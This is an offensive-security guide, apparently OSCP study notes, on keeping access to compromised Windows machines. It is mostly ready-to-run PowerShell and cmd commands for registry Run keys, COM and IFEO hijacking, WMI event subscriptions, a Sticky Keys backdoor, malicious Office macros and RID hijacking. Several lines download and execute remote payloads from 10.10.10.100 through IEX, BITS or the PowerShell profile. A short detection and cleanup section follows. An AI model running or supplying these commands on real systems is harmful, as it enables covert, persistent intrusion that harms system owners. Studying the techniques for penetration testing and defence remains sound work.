# Advanced Persistence Techniques

Comprehensive guide for maintaining access on compromised Windows systems - beyond basic scheduled tasks.

---

## Table of Contents
1. [Registry-Based Persistence](#1-registry-based-persistence)
2. [COM Hijacking](#2-com-hijacking)
3. [Service & DLL Persistence](#3-service--dll-persistence)
4. [WMI Event Subscriptions](#4-wmi-event-subscriptions)
5. [Application Hijacking](#5-application-hijacking)
6. [Office & Browser Persistence](#6-office--browser-persistence)
7. [Advanced Techniques](#7-advanced-techniques)
8. [Detection & Cleanup](#8-detection--cleanup)

---

## 1. Registry-Based Persistence

### 1.1 Run Keys (Classic)

**Common Locations:**
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

**PowerShell:**
```powershell
# Current user (no admin required)
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "C:\Windows\Temp\payload.exe" -PropertyType String

# All users (requires admin)
New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SecurityUpdate" -Value "C:\Program Files\Common Files\payload.exe" -PropertyType String
```

**CMD:**
```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f
```

---

### 1.2 Startup Folder

**Locations:**
```
C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
```

**Deploy:**
```powershell
Copy-Item payload.exe "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.exe"
```

---

### 1.3 Screensaver Hijack (T1180)

**Registry:**
```
HKCU\Control Panel\Desktop
  - SCRNSAVE.EXE = path to executable
  - ScreenSaveActive = 1
  - ScreenSaveTimeout = 60 (seconds)
```

**PowerShell:**
```powershell
Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "SCRNSAVE.EXE" -Value "C:\Temp\payload.scr"
Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "ScreenSaveActive" -Value "1"
Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "ScreenSaveTimeout" -Value "60"
```

**Note:** Payload must be .scr extension (rename .exe to .scr)

---

### 1.4 Winlogon Helper DLL

**Registry:**
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
  - Userinit = C:\Windows\system32\userinit.exe,C:\evil.exe
  - Shell = explorer.exe,C:\evil.exe
```

**PowerShell:**
```powershell
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit" -Value "C:\Windows\system32\userinit.exe,C:\Windows\Temp\backdoor.exe"
```

**Trigger:** Every user logon

---

### 1.5 Image File Execution Options (IFEO)

**Debugger Hijacking:**
```
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<target.exe>
  - Debugger = payload.exe
```

**Example:**
```powershell
# Hijack notepad.exe
New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe"
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" -Name "Debugger" -Value "C:\evil.exe"
```

**Result:** When user runs notepad.exe → evil.exe runs instead

---

## 2. COM Hijacking

### 2.1 Understanding COM Hijacking

**Theory:**
- COM objects registered in registry (CLSID)
- Applications load COM objects → execute DLL
- Hijack CLSID → point to malicious DLL

**Attack Flow:**
1. Find commonly used COM object (CLSID)
2. Register user-level override (HKCU)
3. Application loads your DLL instead

---

### 2.2 Finding Hijackable CLSIDs

**PowerShell:**
```powershell
# List all COM objects
Get-ChildItem -Path "HKLM:\SOFTWARE\Classes\CLSID" | Select-Object Name

# Find objects without HKCU override (hijackable)
$hklm = Get-ChildItem "HKLM:\SOFTWARE\Classes\CLSID"
$hkcu = Get-ChildItem "HKCU:\SOFTWARE\Classes\CLSID" -ErrorAction SilentlyContinue

$hijackable = $hklm | Where-Object {
    $clsid = $_.PSChildName
    -not ($hkcu | Where-Object {$_.PSChildName -eq $clsid})
}
```

**Common Hijackable:**
```
{BCDE0395-E52F-467C-8E3D-C4579291692E}  - MMDeviceEnumerator (audio)
{0002DF01-0000-0000-C000-000000000046}  - IE BHO
```

---

### 2.3 Hijacking Example

**Step 1: Create Malicious DLL**
```cpp
// evil.dll - exports DllGetClassObject
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload here
        WinExec("cmd.exe /c whoami > C:\\hijacked.txt", SW_HIDE);
    }
    return TRUE;
}
```

**Step 2: Register Hijack**
```powershell
# Hijack MMDeviceEnumerator (loaded by many apps)
$clsid = "{BCDE0395-E52F-467C-8E3D-C4579291692E}"
New-Item -Path "HKCU:\SOFTWARE\Classes\CLSID\$clsid\InProcServer32" -Force
Set-ItemProperty -Path "HKCU:\SOFTWARE\Classes\CLSID\$clsid\InProcServer32" -Name "(Default)" -Value "C:\evil.dll"
Set-ItemProperty -Path "HKCU:\SOFTWARE\Classes\CLSID\$clsid\InProcServer32" -Name "ThreadingModel" -Value "Apartment"
```

**Trigger:** Next application that uses audio → loads evil.dll

---

### 2.4 Task Scheduler COM Handler

**Registry:**
```
HKCU\Software\Classes\CLSID\{CLSID}\InProcServer32
```

**Persistence via Scheduled Task:**
```xml
<!-- Task that triggers COM object -->
<Exec>
  <Command>rundll32.exe</Command>
  <Arguments>-sta {CLSID}</Arguments>
</Exec>
```

---

## 3. Service & DLL Persistence

### 3.1 NetSh Helper DLL (T1128)

**Theory:**
- netsh.exe loads helper DLLs from registry
- DLL executed as SYSTEM when netsh runs

**Registry:**
```
HKLM\SOFTWARE\Microsoft\NetSh
```

**Implementation:**
```powershell
# Register malicious DLL
reg add "HKLM\SOFTWARE\Microsoft\NetSh" /v evil /t REG_SZ /d "C:\evil.dll" /f

# Trigger (as SYSTEM)
netsh
```

**DLL Requirements:**
- Export: `InitHelperDll`

```cpp
DWORD WINAPI InitHelperDll(DWORD dwNetshVersion, PVOID pReserved) {
    // Payload executes here as SYSTEM
    return NO_ERROR;
}
```

---

### 3.2 Print Monitors (AddMonitor - T1013)

**Theory:**
- Print spooler loads monitor DLLs as SYSTEM
- Persistence via AddMonitorW API

**PowerShell:**
```powershell
# Requires admin
Add-PrinterPort -Name "EvilPort" -PrinterHostAddress "127.0.0.1"

# Load DLL (must export specific functions)
# PortMonitor.dll with InitializePrintMonitor export
$null = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Get-ProcAddress winspool.drv AddMonitorW),
    ([Func[String,Int32,String,Int32]])
).Invoke($null, 2, "C:\evil.dll")
```

---

### 3.3 Hijacking Service DLLs (svchost.exe)

**Theory:**
- svchost.exe hosts multiple services via DLLs
- Hijack legitimate service DLL path

**Example - Netprofm Service:**
```powershell
# Find service DLL
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\Netprofm\Parameters"

# Replace with malicious DLL (requires permissions)
# Backup original:
Copy-Item "C:\Windows\System32\netprofm.dll" "C:\Windows\System32\netprofm.dll.bak"

# Replace with proxy DLL (forwards legitimate calls + runs payload)
Copy-Item "evil.dll" "C:\Windows\System32\netprofm.dll"
```

---

## 4. WMI Event Subscriptions

### 4.1 Permanent WMI Events

**Components:**
1. **EventFilter** - Trigger condition
2. **EventConsumer** - Action to take
3. **FilterToConsumerBinding** - Link them

**PowerShell Example:**
```powershell
# 1. Create Event Filter (trigger every 60 seconds)
$FilterArgs = @{
    Name = 'SystemBootFilter'
    EventNameSpace = 'root\cimv2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $FilterArgs

# 2. Create Event Consumer (run payload)
$ConsumerArgs = @{
    Name = 'SystemBootConsumer'
    CommandLineTemplate = 'cmd.exe /c C:\Windows\Temp\payload.exe'
}
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs

# 3. Bind them
$BindArgs = @{
    Filter = $Filter
    Consumer = $Consumer
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $BindArgs
```

---

### 4.2 Detection & Removal

**List WMI Persistence:**
```powershell
Get-WMIObject -Namespace root\Subscription -Class __EventFilter
Get-WMIObject -Namespace root\Subscription -Class __EventConsumer
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding
```

**Remove:**
```powershell
Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='SystemBootFilter'" | Remove-WmiObject
Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter "Name='SystemBootConsumer'" | Remove-WmiObject
```

---

## 5. Application Hijacking

### 5.1 Sticky Keys Backdoor (T1015)

**Theory:**
- Accessibility features launch at login screen
- Replace with cmd.exe → backdoor

**Target Files:**
```
C:\Windows\System32\sethc.exe       - Sticky Keys (press Shift 5x)
C:\Windows\System32\utilman.exe     - Utility Manager (Win+U)
C:\Windows\System32\osk.exe         - On-Screen Keyboard
C:\Windows\System32\narrator.exe    - Narrator
C:\Windows\System32\magnify.exe     - Magnifier
```

**Implementation:**
```cmd
# Backup original
takeown /f C:\Windows\System32\sethc.exe
icacls C:\Windows\System32\sethc.exe /grant administrators:F
copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc.exe.bak

# Replace with cmd.exe
copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
```

**Trigger:** At login screen, press Shift 5x → CMD as SYSTEM

---

### 5.2 File Extension Hijacking

**Hijack .txt files:**
```powershell
# Backup
$backup = (Get-ItemProperty "HKCR:\txtfile\shell\open\command")."(Default)"

# Hijack
Set-ItemProperty -Path "HKCR:\txtfile\shell\open\command" -Name "(Default)" -Value "C:\evil.exe `"%1`""
```

**Result:** Opening any .txt file runs evil.exe

---

### 5.3 LNK Shortcut Modification

**Modify existing shortcuts:**
```powershell
$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut("C:\Users\Public\Desktop\Google Chrome.lnk")

# Prepend payload before legitimate target
$shortcut.TargetPath = "cmd.exe"
$shortcut.Arguments = "/c C:\payload.exe && `"C:\Program Files\Google\Chrome\Application\chrome.exe`""
$shortcut.Save()
```

---

## 6. Office & Browser Persistence

### 6.1 Office Add-Ins

**Word Add-In:**
```
C:\Users\<user>\AppData\Roaming\Microsoft\Word\STARTUP\evil.dotm
```

**PowerPoint:**
```
C:\Users\<user>\AppData\Roaming\Microsoft\AddIns\evil.ppam
```

**Registry:**
```
HKCU\Software\Microsoft\Office\<version>\Word\Security\AccessVBOM = 1
HKCU\Software\Microsoft\Office\<version>\Word\Addins\evil.dotm
```

---

### 6.2 Office Templates

**Normal.dotm Hijack:**
```powershell
# Modify Word template
Copy-Item malicious.dotm "$env:APPDATA\Microsoft\Templates\Normal.dotm"
```

**Auto_Open Macro:**
```vb
Sub AutoOpen()
    Shell "cmd.exe /c powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.100/shell.ps1')"
End Sub
```

---

### 6.3 Browser Extensions (Chrome/Edge)

**Registry:**
```
HKCU\Software\Google\Chrome\Extensions
HKLM\Software\Google\Chrome\Extensions
```

**Force-install Extension:**
```json
{
  "external_update_url": "https://clients2.google.com/service/update2/crx",
  "update_url": "http://10.10.10.100/evil.crx"
}
```

---

## 7. Advanced Techniques

### 7.1 BITS Jobs (T1197)

**Background Intelligent Transfer Service:**
```powershell
# Create BITS job that downloads and executes payload
Start-BitsTransfer -Source "http://10.10.10.100/payload.exe" -Destination "C:\Windows\Temp\update.exe" -Asynchronous -Priority High

# Monitor and execute on completion
$job = Get-BitsTransfer
while ($job.JobState -eq "Transferring") { Start-Sleep -Seconds 1 }
Start-Process "C:\Windows\Temp\update.exe"
```

**Persistence:**
```powershell
# BITS job persists across reboots
bitsadmin /create /download UpdateJob
bitsadmin /addfile UpdateJob http://10.10.10.100/payload.exe C:\Windows\Temp\payload.exe
bitsadmin /setnotifycmdline UpdateJob C:\Windows\Temp\payload.exe NULL
bitsadmin /resume UpdateJob
```

---

### 7.2 Time Provider Hijacking (T1209)

**Registry:**
```
HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\<provider>
  - DllName = evil.dll
```

**PowerShell:**
```powershell
New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\MyProvider" -Name "DllName" -Value "C:\evil.dll"
Set-Service w32time -StartupType Automatic
Start-Service w32time
```

---

### 7.3 SIP & Trust Provider Hijacking (T1198)

**Subject Interface Package (SIP):**
- Controls file signature verification
- Hijack → bypass signing checks

**Registry:**
```
HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{GUID}
  - Dll = evil.dll
```

---

### 7.4 Application Shimming (T1138)

**Shim Database:**
```cmd
# Create shim database
sdbinst.exe evil.sdb

# Registry:
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB
```

---

### 7.5 PowerShell Profile

**User Profile:**
```
$PROFILE
C:\Users\<user>\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
```

**Add Persistence:**
```powershell
echo 'IEX(New-Object Net.WebClient).DownloadString("http://10.10.10.100/shell.ps1")' >> $PROFILE
```

**Trigger:** Every PowerShell session

---

### 7.6 RID Hijacking

**Theory:**
- Modify user RID in SAM
- Normal user → Admin RID (500)
- User appears normal but has admin rights

**Tool: Mimikatz**
```
privilege::debug
misc::skeleton
sid::patch /sam:C:\Windows\System32\config\SAM /user:normaluser /rid:500
```

---

## 8. Detection & Cleanup

### 8.1 Detect Persistence

**Autoruns (Sysinternals):**
```cmd
autorunsc.exe -a * -c -h -s '*' -nobanner > autoruns.csv
```

**PowerShell Audit:**
```powershell
# Run Keys
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"

# Services
Get-Service | Where-Object {$_.StartType -eq "Automatic"}

# Scheduled Tasks
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"}

# WMI
Get-WMIObject -Namespace root\Subscription -Class __EventFilter
```

---

### 8.2 Remove Persistence

**Registry:**
```powershell
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Malware"
```

**Scheduled Tasks:**
```cmd
schtasks /delete /tn "MaliciousTask" /f
```

**Services:**
```cmd
sc delete MaliciousService
```

**WMI:**
```powershell
Get-WMIObject -Namespace root\Subscription -Class __EventFilter | Where-Object {$_.Name -eq "EvilFilter"} | Remove-WmiObject
```

---

## 9. OSCP Practical Guide

### Priority Techniques:
1. ✅ **Run Keys** - Simple, effective
2. ✅ **Scheduled Tasks** - Already common in OSCP
3. ✅ **Services** - Long-term persistence
4. ⚠️ **WMI Events** - Stealthy, harder to detect
5. ⚠️ **COM Hijacking** - Advanced, very stealthy

### Quick Persistence Script:
```powershell
# Multi-method persistence
# 1. Run Key
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Update" -Value "C:\Windows\Temp\payload.exe"

# 2. Startup Folder
Copy-Item payload.exe "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe"

# 3. Scheduled Task
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\payload.exe" /sc onlogon /ru System
```

---

## 10. References
- Red Team Notes: https://www.ired.team/offensive-security/persistence
- MITRE ATT&CK: Persistence Techniques
- Autoruns: https://docs.microsoft.com/sysinternals/downloads/autoruns

---

**OSCP Note:** Focus on Run Keys, Scheduled Tasks, and Services. Have persistence scripts ready for post-exploitation.
